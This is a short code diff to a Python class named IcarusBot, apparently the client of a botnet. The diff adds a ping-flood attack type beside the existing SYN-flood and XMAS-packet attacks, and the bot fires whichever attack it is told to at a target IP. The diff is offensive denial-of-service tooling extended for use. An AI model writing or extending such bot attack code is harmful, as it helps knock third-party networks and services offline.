@@ -6,7 +6,7 @@ import threading
 import time
 from enum import Enum
 from socket import timeout
-import syn_flood, xmas_attack
+import syn_flood, xmas_attack, ping_flood
 
 import requests
 from win10toast import ToastNotifier
@@ -150,6 +150,8 @@ class IcarusBot:
                         syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, [1])
                     elif attack_type == 'XMAS_FLOOD':
                         xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, [1])
+                    elif attack_type == 'PING_FLOOD':
+                        ping_flood.PING_Flood(target_ip, NUM_PACKETS_TO_SEND)
                     else:
                         print("No attack type specified")
 
